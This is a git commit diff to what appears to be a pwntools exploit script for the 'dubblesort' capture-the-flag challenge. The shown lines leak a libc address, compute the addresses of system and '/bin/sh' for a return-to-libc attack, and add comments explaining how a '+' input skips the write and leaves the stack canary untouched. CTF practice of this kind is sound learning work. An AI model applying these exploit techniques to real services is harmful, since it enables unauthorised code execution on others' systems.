19c211dd55e8079fe68ebda07bb9fd713006bb73
jamesyoung0623 <b06901077@ntu.edu.tw>
2020-06-03 17:36:25 +0800

    up to date

--- pwn/dubblesort/dubblesort.py
+++ pwn/dubblesort/dubblesort.py
@@ -11,18 +11,19 @@ server.recv()
 server.sendline(payload)
 libc_addr = u32(server.recv()[30:34])-0xa
 libcbase_addr = libc_addr - got_plt_offset
-#print hex(libcbase_addr)
-#onegadget_addr =0x3a819 + libcbase_addr
 sys_addr = libcbase_addr + libc.symbols['system']
 bin_sh_addr = libcbase_addr + libc.search('/bin/sh').next()
 
 server.sendline('35')
 server.recv()
 
+# 24 bytes to go before canary
 for i in range(24):
     server.sendline('0')
     server.recv()
 
+# '+' is a legal input but won't be written to the stack
+# thus we can use it to surpass the canary
 server.sendline('+')
 server.recv()
 
